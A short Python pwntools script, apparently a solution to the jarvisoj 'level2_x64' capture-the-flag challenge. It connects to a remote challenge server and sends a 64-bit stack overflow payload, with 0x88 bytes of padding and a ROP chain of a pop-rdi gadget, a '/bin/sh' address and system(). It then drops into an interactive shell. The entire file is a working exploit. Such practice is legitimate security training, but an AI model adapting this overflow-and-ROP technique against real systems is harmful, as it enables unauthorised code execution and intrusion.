from pwn import *

conn = remote('pwn2.jarvisoj.com', '9882')
#elf = ELF('./level2_x64.04d700633c6dc26afc6a1e7e9df8c94e')

# sys_addr = elf.symbols['system']
# bin_sh = elf.search('/bin/sh').next()

payload = 'a' * 0x88  + p64(0x00000000004006b3) +   p64(0x0000000000600a90) + p64(0x00000000004004C0)

conn.recvline()
conn.sendline(payload)

conn.interactive()